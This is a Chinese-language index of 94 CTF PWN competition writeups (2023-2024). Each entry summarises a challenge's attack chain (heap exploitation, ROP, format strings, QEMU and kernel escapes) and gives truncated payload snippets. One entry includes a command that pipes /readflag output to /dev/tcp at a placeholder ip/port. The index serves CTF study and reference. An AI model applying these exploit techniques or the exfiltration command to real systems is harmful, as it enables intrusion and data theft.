---
title: Des-CTF 语料索引 — PWN（2023-2024）（94 篇比赛 WP）
tags: [source-index, corpus, des-ctf, wp, pwn]
category: pwn
triggers: ["ret2libc", "orw", "UAF", "off-by-one", "fmt-string", "protobuf", "rop", "glibc-2.35", "seccomp", "libc-2.23", "_IO_wfile_jumps", "栈迁移", "House of Apple 2", "canary-leak", "libc-leak", "tcache-poisoning", "glibc", "house-of-apple", "race-condition", "base64-decode"]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge]
---

# Des-CTF 语料索引 — PWN（2023-2024）

## Summary

外部语料库 `Dest1ny-Sec/Des-CTF-Knowledge` 中 **94 篇 PWN（2023-2024） 比赛 WP**（覆盖 80 场比赛）的结构化索引。
每条记录保留「比赛 → 题目/攻击链 → 关键 payload → 要义」，原始全文未镜像，需细节时按 `contest` 回源 GitHub 的 `CTF大赛WP集合/articles/<文件名>.full.md`。

## Key Points

- 高频考点（按 tags 词频）：ret2libc、orw、UAF、off-by-one、fmt-string、protobuf、rop、glibc-2.35、seccomp、libc-2.23、_IO_wfile_jumps、栈迁移、House of Apple 2、canary-leak、libc-leak
- 高频比赛：看雪论坛 ctfiot 系列、强网杯、春秋杯、网鼎杯、D3CTF、bi0sCTF、鹏城杯、看雪2023 KCTF年度赛
- tags 来自上游 frontmatter（允许跨赛道噪声，如 Web 页出现 ret2libc），仅作检索线索
- 用法：Grep 本页的比赛名或考点词 → 命中条目 → 需要细节时回源原文；不要在本页上做二次推理

## 按比赛分组

### 2023 ACTF（1 篇）
- 2023 ACTF：QEMU 用户态 pwn + io_uring + MMIO/PMIO + 自写 loader → `leak_u64(heap_base + 0x000e28) - 0xa23d4f = qemu-system-x86_64 base`；QEMU 用户态逃逸是 2023+ 高级 pwn；io_uring + sendmmsg 可绕 seccomp；MMIO/PMIO…

### 2023 AVSS（1 篇）
- AVSS 2023 移动安全+内核 — Parcel LaunchAnywhere + broadcast 触发 + Android 7/8/9/10 内核栈溢出 ROP + canary…；Parcel 数据可构造恶意 Bundle 触发 LaunchAnywhere;内核栈溢出 4 个字节 0x61/0x63/0x6…

### 2023 Black Hat（1 篇）
- 单缓冲区溢出 + scanf 长输入触发 House of orange + unlink + small bin 链 + tcache_put，最后 House of Apple 2 收尾… → `/`；/

### 2023 CISCN（1 篇）
- CISCN 2023 华东南分区赛 7 道 PWN 复盘，覆盖栈劫持/UAF/Seccomp/SVM 多种高阶技巧。 → `glibc 2.35 safe-linking 异或 + _IO_list_all 攻击 + ORW 链`；glibc 2.35 引入的 safe-linking 异或 + _rtld_global 攻击面让 house of banan…

### 2023 CSAW CTF（1 篇）
- CSAW CTF 2023 — unlimited_subway 32位 canary按字节泄+super_secure_heap 64位 PIE+Full RELRO set/delete…；按字节 (printf %02x) 读 canary 是经典;32 位 Partial RELRO 可直接覆盖返回;64 位 PI…

### Codegate CTF 2023（1 篇）
- Codegate 2023两道pwn：pcpu寄存器竞态UAF+sea signed混淆AES-CBC → `prog=[alloc_list(0),alloc_list(1),copy_reg(0,1),write_reg0_idx(0,10),alloc_list(3),dump_re…`；sleep(1)竞态+register复用可OOB；signed/unsigned混淆可扩大memcpy长度

### 2023 DAS（1 篇）
- DAS 战队 3 题 PWN 出题思路 + CVE-2023-40930 vold 命令注入漏洞介绍，作者 Nameless_a。 → `CAN 命令读 canary + CVE-2023-40930 vold 注入`；CVE-2023-40930 是 Android vold 守护进程命令注入；构造特制 label 触发 system()。

### 2023 DEFCON（1 篇）
- DEFCON 2023 Quals open-house PWN 题复盘，日文 WP。 → `cyclic 0x208 + 11 次 delete 触发 unsorted bin`；11 次 delete(1) 同一个 index 触发 tcache 重复 + unsorted bin 残留。

### DamCTF 2023 / Midnight Sun CTF 2023（1 篇）
- DamCTF 2023 Golden Banana：gets栈溢出+fmt-string劫持房间指针 → `gets(g.input_buf); printf(l->description) # fmt-string leak`；gets+printf描述信息可fmt-string泄露地址

### DiceCTF 2023（1 篇）
- DiceCTF 2023 bop：ret2libc+ORW（open+read+write）flag.txt → `pay = b'a'*32 + p64(0x404120-0x8) + pop_rdi + 0x404090 + printf + pop_rdi + 0x404100 + get…`；32字节溢出+leave_ret栈迁移实现 ORW 三件套

### 2023 Dozer（1 篇）
- 2023 Dozer 新生赛考核 5 题 WP，srand 随机数预测 + ret2libc + pyzipper AES 嵌套 + RSA + 01248 密码。 → `srand(0x22) srand(0x2a) ret addr 0x4007e3 01248 密码`；srand 种子固定可预测；ret2libc 经典栈溢出 0x78 padding；pyzipper 是 AES 加密 zip；0…

### 2023 Hack-A-Sat 4 Qualifiers（1 篇）
- Hack-A-Sat 4 Magic Space Bussin：奇数hex越界读 → `奇数长度hex → oob read`；解析函数中奇偶处理不一致是经典OOB漏洞

### 2023 Midnight Sun CTF（1 篇）
- Midnight Sun CTF 2023 联合战队 (Polaris + ChaMd5 Venom = VP-Union) 排名第 23: pyttemjuk ret2libc + get… → `/`；/

### N1CTF 2023（1 篇）
- N1CTF 2023 pwn1OS：iOS addrof + arbitrary_read + ISA 泄漏 + ASLR 绕过。；iOS pwn 经典 addrof + arbitrary_read 组合；NSData 伪造是任意读核心；ISA + class…

### 2023 NKCTF（1 篇）
- NKCTF babyHeap 经典 off-by-one 堆题，覆盖 size+1 字节改 size 字段触发 tcache 攻击。 → `glibc 2.31 tcache poisoning + off-by-one 0x90 bin`；off-by-one 是 PWN 入门最常见堆漏洞；tcache 0x90 大小喷射配合 size 字段篡改可实现任意地址写。

### Plaid CTF 2023（1 篇）
- Plaid CTF 2023 Polaris 第 4 名联合战队：wine Windows 堆溢出 ROP+execve 任意读写、GDB 计时爆破 16 字符、source map VLQ… → `b''dump_memory'' (备份中间内存 0xa10 字节) + flat({0: 0x00000003af6b3fa9 pop rdx, 0x00000003af6860…`

### 2023 RCTF 2022（1 篇）
- RCTF2022 赛车游戏 PWN：ncurses 菜单 + winTimes 计数器 + cheat 检测触发 free + 空名 fix/fetch 漏洞 + 6 字节 carName… → `buy('NormalCar', p64(heap+0x330)[:6]) + buy('NormalCar', p64(heap+0x330)[:6]) + buy('Norma…`

### 2023 RWCTF 5th（1 篇）
- RWCTF 5th IoT ShellFind：UDP ipfind 服务 + base64 解码栈溢出 + mips 无 canary ROP 改 GOT + 重启服务复用 shellco… → `data=b'FIVI\x00\x00\x00\x00\x0a\x02\x00\x00\x00\x00\x00\x00\xff'*6 + b64('admin:0\r\n'+pad…`

### Real World CTF 2023（1 篇）
- Real World CTF 2023 NonHeavyFTP: LightFTP 2.2 源码审计发现 ftpUSER 共享 context->FileName 触发 list_threa… → `p.sendline(b"LIST ") + p.sendline(b"USER /") + connect(data_port)`；FTP USER/LIST 等命令共享 context->FileName 缓冲区是经典 race condition；strcp…

### 2023 RealWorld CTF 5th（1 篇）
- RealWorld CTF 5th r3kapig 多方向 WP：IoT mips UDP 栈溢出 + FTP PASV 注入 + Redis Jemalloc extent_hooks 任… → `cmds = ["echo '#!/bin/bash'>/tmp/a", "echo -n '/readflag>/dev/tcp/ip/port'>>/tmp/a", "chmo…`

### 2023 RicercaCTF（1 篇）
- Ricerca CTF 2023 Oath to Order 高级堆题，aligned_alloc size=0 整数零化触发任意长输入 + fastbin 残留 libc 指针泄地址。 → `aligned_alloc(0xF0, 0) + getstr size=0 任意长输入 fastbin 残留 libc 指针 0x7f1773219ce0`

### 2023 SECCON Beginners CTF（1 篇）
- SECCON Beginners CTF 作問者 3 题：shaXXX (Python pyc 缓存读) + drmsaw (HLS 自定义 CustomLoader 替换 AES-128… → `key=[99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41] + IV=0x00*16`

### 2023 TetCTF（1 篇）
- TetCTF 2023 Mail Service：mailclient 读邮件栈溢出 + 攻击 mailserver update.event 写任意文件 + ROP。 → `send_event(build_packet(b"ATF", payload + 0x804 A))`；当协议允许任意文件写入时，可写 mail 内容主题字段注入 ROP 链；邮件客户端解析主题时触发栈溢出。

### 2023 VCTF（1 篇）
- VCTF apples leak libc 操作复现，高版本 glibc 堆合并 + overlapping。 → `unsortedbin 合并 + overlapping + off-by-null`；高版本 glibc 2.35 堆合并时 off-by-one 可以构造精确的 overlapping + 假 chunk。

### 2023 justCTF（1 篇）
- justCTF 2023 VP-Union 战队 PWN 复盘，house + nucleus 两题。 → `house 整数下溢 + nucleus 2.35 tcache attack`；justCTF 难度比国内比赛高一档，house/nucleus 都是中高难度题。

### m0leCon Finals 2023（1 篇）
- m0leCon Finals 2023 决出的 Linux 内核 PWN 题 Dirty Pagetable 完整 shellcode 复盘，覆盖 kaslr 定位+提权+namespace… → `lea rdi, [r15 + init_cred] / mov [rsp+0x00], rax (zero) / mov [rsp+0x10], 0x22222222222222…`

### 2023 ångstromCTF（1 篇）
- VP-Union 战队 ångstromCTF 2023 联合参赛 WP，复盖 fmt 字符串 %*c 改 rbp、Elixir BEAM 反编译、Jinja2 SSTI 等多元领域。 → `slack sla(b''Professional): '', (b''%'' + str((i + 3)&0xffff).encode() + b''c%25$hn'').lju…`

### 2023 华为杯研究生国赛 adv_lua（1 篇）
- 华为杯 adv_lua：bytes 自定义结构 move 同地址 UAF + 堆头 address 劫持 + 函数指针改 system 执行 /readflag。；Lua 自定义 C 数据结构逆向要找 move(dst,src) 同样地址漏洞；堆头 size+address 字段是 UAF 利…

### 强网杯 2023（1 篇）
- 强网杯 warmup：off by null + House of apple2 + _IO_wfile_overflow + 栈迁移 ORW。；高版本 off by null 需绕 bck->fd==P 检查；House of apple2 用 _IO_wfile_jump…

### 2023 春秋杯（3 篇）
- 春秋杯两题入门ROP，覆盖ret2vuln循环喷射+整数下溢gets覆盖的经典入门路径。 → `题目2 length=-1 整数下溢 + payload A*104 + p64(pop_rdi_ret) + p64(binsh) + p64(system) 覆盖PRNG栈槽`；length字段使用int32比较但调用gets时无符号，length=-1溢出为最大正值绕过长度检查；ret2vuln+exte…
- 春秋杯两道沙箱题打通用户态shellcode三件套(mprotect+openat+mmap+writev)。 → `题目1 payload = A*56 + p64(canary) + p64(stack) + p64(mprotect_args) + asm(shellcode) 题目2 sh…`；seccomp沙箱下system/binsh失效必须ORW；writev能一次把多块非连续内存写到fd；mprotect改栈权限+…
- 春秋杯 sigin_shellcode：探索 MIPS 可见字符组合指令，R 型 opcode=0 不可用 + J 型只有 jalx + 没有 syscall。；通用 MIPS 可见字符 shellcode 几乎不可能（无 syscall 指令），异构 pwn 题设计思路。

### 春秋杯2023春季赛（1 篇）
- 春秋杯2023春季赛pwn/web/misc三方向：p2048栈溢出+partial write+FTP fmtstr+got覆写+lua堆 → `p2048:sl(b'a'*(1048+4)+b'\x60'+b'\x5e'+b'\xff');LzhiFTP:'No%6$p'泄elfbase+idx=-16负数越界;setco…`；partial write爆破4bit+fmtstr %p泄elfbase+idx未检查负数是常见pwn套路

### 柏鹭杯2023（1 篇）
- 柏鹭杯2023 Polaris战队综合WP：PWN+Redis SSH公钥+Java反序列化+Express file协议+RSA连分数+维吉尼亚 → `eval:libc+0x52290+0x54310+0x1b45bd+0x23b6a;heap:guard+heap_addr+image_addr 0xEAD;redis-cli…`

### 看雪2023 KCTF年度赛（2 篇）
- KCTF2023年度赛Q9《突破防线》Go VM+vmfs驱动+IOCTL通信+自定义指令VM+sha512 → `VMFS_CREATE_FILE=0xff00;VMFS_MOVE_TO_TRASH=0xff01;VMFS_DELETE_FROM_TRASH=0xff02;VMFS_WRITE…`；Go写的VM+内核驱动组合：cgo调用ioctl传递用户态buffer到内核VM执行
- KCTF2023年度赛Q4《AI控制空间站》LLVM PASS PWN：VecPass.so+vector.erase() double free+glibc 2.35 → `LLVM 14.0.0;VecPass.so;opt -winmt exp.ll -enable-new-pm=0;runOnFunction;函数名KCTF过滤;vector.e…`

### 2023 第三届陕西大学生网安技能大赛（1 篇）
- 第三届陕西大学生网安赛：数字拆解密码+栈溢出ret2csu+canary泄漏ret2libc → `a='8881088410842088810810842042108108821041010882108881' 数字拆解;p64(0x00000000004005d6) ret2…`；数字字符串按0拆分后逐段求和+chr(sum+64)得字母；canary泄漏+ret2libc是栈溢出通用解

### 2023 绿城杯（1 篇）
- 绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget → `malloc(0x100);free(0);show(0)→leak main_arena+88;libc_base=leak-0x3c4b78;__malloc_hook=lib…`

### 2023 西湖论剑 2022 中国杭州网络安全技能大赛 初赛（1 篇）
- 西湖论剑 2022 三道 PWN 官方 WP：babycalc 单字节溢出+栈迁移、jit 自研 IR 编译器整数溢出、Message Board seccomp 沙箱下 orw+栈迁移双跳… → `jit sc="\x68/sh\x00" + "\x58\x48\xc1\xe0\x20" + "\x68/bin" + "\x5f\x48\x09\xf8" + "\x50\x4…`

### 鹏城杯 2023（1 篇）
- 鹏城杯2023 Polaris战队WP,PWN4题(6502模拟器+silent栈迁移+babyheap FSOP+咖啡机)+RE2题(Rust猜数字+RC4 PE节区)+WEB3题(反序列… → `6502 LDX/LDA/ADC/STA字节码组合`；6502/ARM等异构CPU模拟器PWN题的关键是识别寻址模式(IZX)+指令集,栈迁移爆破write是2023年新热点,Rust…

### 2024 第四届网鼎杯（1 篇）
- 玄武 pwn02：fork 后栈溢出 + 通用 gadget 链 SROP + read 写 bss + AE64 shellcode 编码 — 大程序最常用 ROP 套路。 → `rax=0x450277; rdi=0x40213f; rsi=0x40a1ae; rdx=0x485feb; rbp=0x401771; syscall=0x41ac26; le…`

### 2024 网鼎杯（1 篇）
- 网鼎杯玄武 pwn2：两次 read 触发二次栈溢出，用一连串通用 gadget 拼 SROP read 写 /bin/sh + execve，0x3B 经典 syscall 调用链。 → `rax=0x0000000000450277; syscall=0x41ac26; sh_addr=0x00000000004C5000`；大程序（看上去像真实服务）通用 gadget 链拼 SROP 是必备：rax=59 / rdi=sh_addr / rsi=0 /…

### 2024 羊城杯粤港澳大湾区网络安全大赛（1 篇）
- 4 道堆栈综合：rbp 控 ret2libc、城市菜单 House of Apple 2 ORW、C++ String catch system、largebin 复用 HoA2——一题一… → `payload = p64(bss)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)`；pstack 0x10 字节溢出看上去不够拿 shell，但 leave;ret + 二次 leave 就能把栈劫到 bss 上…

### 2024 长城杯初赛（1 篇）
- 2024 长城杯初赛 3 道 Pwn：SomeHash fmt-string 栈泄露 + %hn 任意地址写 ROP + SomeTime 堆菜单 house_of_minho _IO_li… → `payload = b"xxx>%6$p->%19$p->%21$p-" / cnt 偏移 0x5078 写 0x100 / %23$hn + %53$hhn 双写 / syste…`

### 2024 鹏程杯（1 篇）
- cool_book 50 块后 v6 越界覆盖返回地址到堆地址 + 堆上写 ORW shellcode，seccomp 禁 execve → 走手写 open/read/write。 → `asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall')`；开了 seccomp 的 pwn 题，syscall 只留 read/write/open 等几条 → 必须在堆上写 ORW sh…

### 2024 AlpacaHack（1 篇）
- AlpacaHack Round 1 Pwn — abs(INT_MIN) 整数溢出旁路 size 校验 + unsigned 比较触发 280 字节栈溢出 + p32(win) 覆盖返回地…；abs() 整数溢出是 size 校验旁路经典手法;unsigned 比较 -1 > BUF_SIZE 也是常见;No PIE +…

### Backdoor-infoseciitr 2024（1 篇）
- Backdoor-infoseciitr 2024 susalloc 逆向 + 利用：自定义堆实现 + set_value 相对偏移 0xffffffe0 单字节写 + fast_bin 伪… → `set_value(idx, off, val) / off = -32 (0xffffffe0) 任意写 / forged_chunk = b'A'*16 + p64(0xf0)…`

### 2024 BraekerCTF（1 篇）
- BraekerCTF 2024 — 32位 Linux shellcode: sys_read 0x18 字节 + add al,[eax] 链 + nop+write+int 0x80+j…；极简 shellcode 注入常需要多次拼接;jmp ecx 是最简 shellcode 入口;自修改代码 + XOR 是 ant…

### 2024 ByteCTF大师赛（1 篇）
- House of Apple 2 改 stdout 劫持 + Spring Boot Swagger profileRegex 模板注入 + SSIM AI 图像攻击。 → `flat({0x0:' sh', 0xa0:p64(stdout-0x130+0xd8), 0x10:p64(libc.symbols['system']), 0x20:p64(s…`

### C++ PWN 异常处理 / N1CTF2023 / 羊城杯 2024（1 篇）
- C++ PWN 异常处理 + 3 道题：exc _Unwind_RaiseException 链劫持 / n1canary getrandom+user_canary XOR / 羊城杯 l…；C++ try/catch/throw 的 _Unwind_RaiseException + __cxa_throw 链可劫持返回…

### 2024 CISCN 半决赛 (AWDP)（1 篇）
- CCB CISCN 半决赛 AWDP 模式 pwn 双题 (传统菜单 + protobuf 协议)，都是 stdout partial overwrite + __free_hook/sys…；AWDP 模式 (Attack With Defense Plus) 攻防兼备，2 道都用 stdout partial over…

### 2024 CISCN总决赛（1 篇）
- 第十七届CISCN总决赛AWDP PWN2题:tar update.tar.gz(update.sh+pwn_fix)替换赛题二进制+chmod+AWDP赛制攻防两用/pwn1格式化字符串+… → `mv pwn_fix /home/ctf/pwn + chmod 777/pay = f"%{6+6}$p" → stack/libc_base = int(ru(''!''),1…`

### 2024 CS:APP（1 篇）
- CSAPP 经典 Attack Lab 三阶段 ROP 题解：ret2func → ret2arg → 栈地址存 cookie 字符串后 ret2arg。 → `Phase 1: 0x28 bytes 0x00 + p64(0x4017c0) Phase 2: 0x38 bytes + pop_rdi(0x59b997fa) + touch…`

### 2024 CVE-2023-3640 内核提权（1 篇）
- CVE-2023-3640 cpu_entry_area 内核提权: ioctl 泄基址 + ptrace 硬件断点抓寄存器 + 寄存器填 ROP 提权。；cpu_entry_area 是 Linux 内核 KASLR 旁路经典, 泄露内容得内核 text 段偏移; ptrace dr…

### 2024 D3CTF（2 篇）
- D3CTF 2024 Polaris 战队 PWN 方向三道高质量 WP：QEMU 客制化设备/PHP 扩展/proc mem 改 libc。 → `QEMU MMIO+PMIO + PHP off-by-one + /proc/self/mem code 改写`；QEMU 客制化设备的"内容大小越界 + 双接口(MMIO/PMIO)"是 CTF PWN 新热点；PHP Zend 分配器 of…
- D^3CTF 2024 PwnShell PHP 扩展 + Kernel Sandbox 两道 Pwn。 → `/proc/self/maps + PHP Zend 堆 off-by-one`；PHP 扩展 off-by-one + Zend 分配器 + tcache double-free 经典利用。

### DeadSec CTF 2024（1 篇）
- DeadSec CTF 2024 user-management fmt-string三段写GOT表 → `payload = b''%c''*14 + b''%''+str(d1-14)+b''c%hn'' + ... # 3段%hn`；%hn可按2字节写入，3次%hn覆盖6字节地址

### 2024 F.Z.N CTF（1 篇）
- F.Z.N PWN 3题：canary爆破+stack_pivoting+tcache poisoning → `edit(4, p64(__free_hook)); add(0x68, p64(system)); delete(7) # /bin/sh`；栈迁移rsp=leak-0x40+leave_ret；tcache改fd指向__free_hook

### 2024 HITCON CTF setjmp (chinese writeup)（1 篇）
- HITCON setjmp 题目：longjmp 缓冲区溢出+堆利用 → `longjmp(saved_env_menu, 1)`；setjmp/longjmp 保存的寄存器上下文可被攻击

### 2024 Intigriti（1 篇）
- Intigriti CTF 2024 Mini-Venom 战队的 Pwn 题合集 (RiggedSlot / Retro2Win)，ret2libc + AE64 shellcode 编码…

### 2024 KCTF大赛（1 篇）
- seccomp 三 syscall + ptrace 注入 1 号进程 + 改 sleep 的 rip 跑 shellcode。 → `seccomp_init(SCMP_ACT_KILL) + rule_add(ALLOW, ptrace/read/wait4) ; PTRACE_POKETEXT +0x77ae…`；沙盒类 pwn 关键在 ptrace 注入到同 docker 内其他进程（通常有 sleep infinity）借其身份开 IO。

### 2024 N0wayBack 强网杯 / prpr（1 篇）
- N0wayBack 战队 40 小时做 prpr 强网杯 32 小时出题：自定义 VM 逃逸 + seccomp ORW + mprotect rop。；自定义 VM 逃逸要先控制 vm 内部任意写 (改 register 指针/数据段) → 改主程序返回地址 → 栈迁移 → rop…

### 2024 NCTF（1 篇）
- NCTF 2024 Mini-Venom: Pwn libc 2.39 House of cat + Web SSTI (template 解析 <%%>) + sqlmap --eval… → `/`；/

### 2024 NSSCTF（1 篇）
- NSSCTF 3rd 部分 writeup: pwn 签到 (cat 1>&2) + ezstack (libc 2.31 fmt+canary) + ezheap (libc 2.35 H… → `/`；/

### RCTF 2024（1 篇）
- RCTF 2024 多题大杂烩：Crypto DSA 私钥恢复 BKZ + RSA LLL 64字符 XCTF 背包 + PWN 多线程 race condition + dwebp CVE… → `Ge.BKZ(block_size=30) 找 k0 + d = (k0*s0-h0)*inv(r0,q) % q + sign(pub, d, "get flag", k0)`

### SCTF 2024（1 篇）
- SCTF 2024 XMCVE-Polaris 第 8 名 (PWN Go UAF + REV ARM TEA/RC4 + Crypto 隐藏 phi Coppersmith + Dual… → `small_roots(f, (2^496, 2^400), m=2, d=3) + dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt…`

### 2024 SEKAICTF（1 篇）
- 50+ 道 PWN/Crypto/Misc 联合战场，Polaris 靠 nolibc EoP + Group Theory DLP 攻破密码套件。 → `judge(int(''1''*bit+''0''*(64-bit), 2)) # PRNG 状态位判定`；自研协议常依赖「randbelow」类可种子化 PRNG；一旦能二分位恢复状态即等于控制输出流。

### 2024 TFCCTF（1 篇）
- 把 tcache_perthread_struct 变成 unsorted bin 的玩法，让 fake chunk 的 fd/bk 把 libc 指针反向注入到 tcache entrie…；任意大小 malloc + UAF 是 House of Water 的入场券；爆破 heapbase 第 4 位 1/16 成功…

### UKFC2024 / CISCN 华北（1 篇）
- UKFC2024 CISCN 华北 pwn 2 题：book tcache poisoning + proc Protobuf 序列化 House of Apple SROP。 → `tcache poisoning __free_hook = system`；Protobuf 序列化通信的程序，size 字段是 sint64/2 实际大小；House of Apple 配合 setcon…

### 2024 bi0sCTF（2 篇）
- bi0sCTF 2024 高质量 Pwn 题，QEMU 自定义 virtio-note 设备 + 越界读写实现 VM Escape。 → `越界读 / 写 cpu_physical_memory 触发 QEMU 进程 RCE`；客制化 QEMU 设备的攻击面在 virtio backend (handle_req / handle_output) + cp…
- bi0sCTF 2024 Android JNI 自定义分配器 Tallocator 题，未翻译版本（中文 WP 暂未覆盖）。 → `自定义 talloc + anti-debug 回调 + wilderness 分配器`；Android 逆向链 = Java → JNI → native lib（libtallocator.so），必须结合三层。

### 2024 公众号文章（小话安全）（1 篇）
- 4道PWN入门题，栈溢出+返回地址覆盖+ROP思路 → `payload = b"a"*32+b"b"*8+rop() # 含add rax,1;ret 循环`；栈溢出三要素：覆盖长度+目标地址+payload构造

### 2024 公众号文章（看雪论坛）（1 篇）
- House of orange+：无free时通过堆溢出+top chunk sysmalloc伪造释放 → `__malloc_hook-0x23 + p64(ogg) # one_gadget`；堆溢出不free时可改top chunk size触发sysmalloc+_int_free

### 2024 国赛信安（1 篇）
- 国赛信安 3 题 PWN：Go gostack syscall ROP 一血 + orange_cat_diary top chunk 缩 + __malloc_hook one_gadge…；Go 二进制 syscall ROP 是大题常见套路；top chunk shrink 触发 unsorted bin 是堆风水经…

### 2024 强网拟态 aaaheap（1 篇）
- 强网拟态aaaheap ARM64架构下的tcache堆利用详解,涵盖Safe-Linking保护绕过(右移12位异或)+GOT泄露libc+environ泄露栈+栈分配+ROP劫持全流程。 → `aarch64 ROP + 栈劫持 + environ leak`；ARM64堆利用与x86差异在寄存器约定(x0-x7参数/x8 syscall/x30 LR);Safe-Linking是glib…

### 2024 强网杯（4 篇）
- 强网杯 bph，glibc 2.39 House of Apple-style 攻击，通过伪造 _IO_wide_data + chain(pivot) 触发 ORW 链。 → `pivot_gadget = libc_base + 0x5ef5f # mov rsp, rdx; ret jumps_mmap = _IO_wfile_jumps + 0xb0`
- 强网杯 bph 变种，通过 _IO_write_base/_IO_write_ptr 范围读 environ 泄栈，再用 _IO_buf_base 改写栈。 → `fake_file_write = flat({0x00: 0x800/0x1000, 0x20: environ, 0x28: environ+8, 0x70: 1, 0x68:…`
- 强网杯 S8 Rust Pwn：Vec<&'static mut Msg> 借用扩展为 'static lifetime 导致悬垂指针，edit 触发 UAF。 → `Vec<&'static mut Msg> + 栈 msg 悬垂 + edit 写 UAF + 后续调用覆盖栈`；Rust 借用检查器不能防止所有生命周期误用，unsafe fn ident() 提升 lifetime 是经典反模式。
- 强网杯 S8 PWN 双题：菜单 PWN 改 libc.got 触发 env(getenv) + expect_number srand(1) 序列预测 + 越界读 code base。；getenv() 内部调用 libc 函数可被 .got 劫持；srand(1) 固定序列爆破是简单 PWN 题常见套路。

### 强网杯 S8 (强网杯 2024)（1 篇）
- 强网杯 S8 Rust Pwn chat-with-me：cve-rs 静态生命周期扩展 POC + Vec<&'static mut Msg> 指针数组劫持 + 任意 8 字节写 + RO… → `const S: &&() = &&(); let f: fn(_, &''a mut T) -> &''b mut T = ident / vec 三指针 start/finis…`

### 2024 御网杯（1 篇）
- 御网杯 3 题 PWN：SROP rax=0x15 sigreturn 调 execve + RWX 栈 fmt 泄 + aarch64 fmt 改 X30 寄存器。；SROP 是绕过单 syscall gadget 限制的利器；栈 RWX 是 fmt + shellcode 的完美组合；aarc…

### 2024 数据安全大赛（1 篇）
- 8 道题合集：非栈 fmt string / base64 循环移位 / RC4+XOR / ftp STOR 计数 / SQL 流量 / 套娃编码 + Arnold → `payload = "%{}c%13$hn".format(write_in - num_len + 5); payload2 = "%{}c%39$hn".format((one…`

### 2024 看雪论坛 ctfiot 系列（4 篇）
- 4 道 PWN 题合集，涵盖 ret2libc 泄地址循环填充、seccomp 下 openat+mmap+writev orw、fmt-string 泄三件套栈迁移、自定义 VM 解释器… → `payload1='a'*0x58+p64(vuln); payload4=p64(0xa)+p64(0xc)+p64(0xfffffffffffffc02)+'sh\x00'`
- 深度逆向 glibc 动态链接器 _dl_runtime_resolve_fxsave 内部，从 PLT 跳转到 _dl_fixup 查找符号的完整调用链。 → `A=arch JT=0x00 ... 0006: 0x15 0x00 0x0d 0xc000003e (BPF 过滤 read/write/open)`；GOT[plt] 首次未解析时跳 _dl_runtime_resolve 触发解析；解析完成后 GOT 写入真实函数地址；_dl_…
- 从 Linux VFS/proc 虚文件系统、sysctl 接口逐层下钻到 load_elf_binary 内核 ELF 加载器，详解 ASLR 0/1/2 三档随机化原理。 → `(get_random_long() & ((1UL<<32)-1)) << 12 = mmap 随机偏移`；ASLR 随机化是加载期 (load_elf_binary) 一次性完成，运行期不可改；mmap 32 bit 随机 + 12 b…
- House of Apple + House of Emma 高级堆攻击联动：House of Apple 写 pointer_guard 解密 pcop，House of Emma 用 p… → `f1.vtable=_IO_wstrn_jumps + f2.vtable=_IO_cookie_jumps+0x58 + magic_gadget=0x146020 (mov r…`

### 2024 第九届 XCTF 国际网络攻防联赛 总决赛（1 篇）
- 第九届XCTF总决赛0解PWN题"All-Pwn-Red-Book App"详解,std::vector push_back realloc导致旧chunk遗留+UAF,vtable边界检查… → `All-Pwn-Red-Book app RCE`；std::vector push_back触发realloc会遗留旧指针,这是C++ PWN的经典漏洞;vtable bounda…

### 2024 网鼎杯（3 篇）
- 网鼎杯 PWN01，glibc 2.31 unsorted bin attack + tcache poison 覆盖 __free_hook=system 经典题。 → `free(8) 触发 system("/bin/sh") 其中 c8 chunk 内填 p64("/bin/sh\x00")`；0x4f8 落在 unsorted bin 范围，0x98 落在 tcache 范围；先用 0x4f8 大块 free 残留 ma…
- 网鼎杯 PWN02，vfork 子进程断点跟随 + 多次 sendlineafter 泄 canary + 自写 read/execve syscall ROP 链。 → `pop_rax=0x450277 pop_rdi=0x40213f pop_rsi=0x40a1ae pop_rdx_rbx=0x485feb syscall=0x41ac26 b…`
- JerryScript Array.pop() 整数下溢触发 length=0xffffffff，配合 ArrayBuffer 相对越界读写实现 aar/aaw，最终改 __libc_sta…；嵌入式 JS 引擎的 OOB 漏洞可通过 JS 高级抽象（Array/DataView）放大为完整读写原语，绕过 ASLR 改 G…

### 2024 网鼎杯玄武组（1 篇）
- 网鼎杯玄武组PWN2多线程题,主进程fork子进程+''gift: %p''泄canary+两次input(0x40/0x100)+两段syscall(读bss+execve /bin/sh… → `canary + ROP(read→bss,execve→/bin/sh)`；fork子进程模式下canary独立,父进程泄漏canary+子进程ROP链崩溃不影响主进程;gdb多线程切换( info thr…

### 2024 长城杯信息安全铁人三项赛（1 篇）
- Protobuf格式字符串解析的菜单add/delete/show题,libc2.31通过0x91 chunk size边界溢出让show泄libc,然后多次add+rm控制chunk到__… → `pay = b':\ntitle:\nAAAAAAAAA:\nsubtitle:A' + p32(0x601)/add(b'Y'*0x120 + p64(free_hook))/a…`

### 2024 鹏城杯（2 篇）
- 鹏城杯两题：银行系统栈溢出 + ROP/leave 跳板 + 函数指针伪造调用。 → `题目1 leave; ret 让 rsp 跳到 0x55555555b700 (即栈上我们布置的 ROP 区) 题目2 bird.func=system + cat.name="/…`；leave; ret 跳板把 rsp 跳到已知地址（提前布置 ROP 的位置）；结构体 func 字段是经典的"伪函数指针"目标，…
- 鹏城杯 VM 逆向 + 整数下溢 set_s 触发 link_s+copy_s 越界 memcpy 实现栈迁移打 ROP。 → `set_s(3, 0x100000000 - 0x108) # u32 下溢让 idx_b = 0xFFFFFFE8 link_s(1,3) copy_s(1, fake_stac…`；自定义 VM 题逆向重点在寄存器/段寄存器字段长度；u32 wrap 减法是绕过长度检查的标准手段；copy_s(1, offse…

## Connections

- 上层索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)

## Open Questions

- 本页为索引层，题目细节请回源；若某场比赛多题值得展开，再单独建 `ctf/<比赛>.md` 实体页。
